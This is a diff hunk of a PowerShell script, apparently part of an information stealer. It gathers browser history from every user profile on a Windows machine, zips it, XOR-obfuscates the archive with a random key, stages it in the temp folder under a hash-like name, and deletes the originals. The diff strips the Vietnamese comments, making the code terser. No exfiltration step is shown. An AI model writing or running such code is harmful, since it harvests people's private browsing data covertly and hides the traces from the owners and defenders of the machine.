@@ -249,38 +249,28 @@ if(!(test-path $path)) {
     New-Item -ItemType Directory -Force -Path $path
 }
 Get-ChildItem C:\Users | ForEach-Object {Get-BrowserData -UserName $_.Name -ErrorAction SilentlyContinue} | Export-Csv $path\BrowserHistory.csv -NoTypeInformation -Force
-# Đường dẫn đến thư mục bạn muốn nén
+
 $sourceFolderPath = $path
 
-# Đường dẫn và tên cho tệp ZIP kết quả
 $outputZipFilePath = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c.zip"
 
-# Tạo một byte key ngẫu nhiên
 $random = New-Object System.Random
 $key = $random.Next(0, 256)
 
-# Nén thư mục thành tệp ZIP
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolderPath, $outputZipFilePath)
 
-# Đọc tệp ZIP đã nén
 $zipBytes = [System.IO.File]::ReadAllBytes($outputZipFilePath)
 
-# Mã hóa tệp ZIP bằng XOR với key
 for ($i = 0; $i -lt $zipBytes.Length; $i++) {
     $zipBytes[$i] = $zipBytes[$i] -bxor $key
 }
 
-# Tạo tên và đường dẫn cho tệp đã mã hóa
 $outputEncryptedFilePath = "$env:tmp\6d30b4e3442b4a5eef8dbc952a52cb3c_.zip"
 
-# Ghi tệp đã mã hóa ra file
 $stream = [System.IO.File]::Create($outputEncryptedFilePath)
 $stream.Write($key, 0, 1)
 $stream.Write($zipBytes, 0, $zipBytes.Length)
 $stream.Close()
 Remove-Item -Path $sourceFolderPath -Recurse -Force
 Get-ChildItem -Path $outputZipFilePath | Remove-Item -Force
-
-# Hiển thị thông báo khi hoàn thành
-# Write-Host "File đã được nén và mã hóa thành công tại: $outputEncryptedFilePath"
